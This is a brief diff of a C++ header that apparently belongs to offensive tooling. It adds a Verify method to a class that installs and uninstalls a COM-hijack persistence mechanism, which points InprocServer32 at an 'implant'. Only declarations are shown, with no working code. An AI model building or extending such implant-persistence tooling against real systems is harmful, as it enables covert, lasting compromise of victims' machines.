@@ -10,6 +10,8 @@ public:
     // to point InprocServer32 to our implant.
     static bool Install(const std::wstring& implantPath, const std::wstring& clsid);
 
+    static bool Verify(const std::wstring& clsid);
+
     static bool Uninstall(const std::wstring& clsid);
 };
 
